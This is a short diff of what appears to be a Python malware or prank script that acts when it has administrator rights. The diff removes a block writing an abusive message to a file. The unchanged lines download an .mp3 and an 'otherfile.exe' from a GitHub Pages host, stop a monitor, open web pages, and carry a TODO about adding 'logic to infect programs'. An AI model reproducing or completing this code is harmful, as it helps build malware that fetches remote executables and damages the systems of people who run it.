@@ -30,16 +30,6 @@ if is_admin():
         #else:
          #   pass
 
-    try:
-        try:
-            hashfile = open("hash.txt", "x")
-            hashfile.write("HAHAH GET FUCKED BITCH")
-            hashpath = os.path.abspath("hash.txt")
-        finally:
-            hashfile.close()
-    except Exception as e:
-        print(e)
-
 
     path = DownloadFile('https://psvks.github.io/psvks/uploads/FullVersion.mp3')
     path2 = DownloadFile('https://psvks.github.io/psvks/uploads/otherfile.exe')
@@ -69,7 +59,7 @@ if is_admin():
         StopMonitor()
         os.system("start https://en.wikipedia.org/wiki/Computer_virus")
         os.system("start https://psvks.github.io/psvks/uploads/fucker.html")
-        os.system(f"start {hashpath}")
+
 
     # TODO: Need to implement a logic to infect programs.
 else:
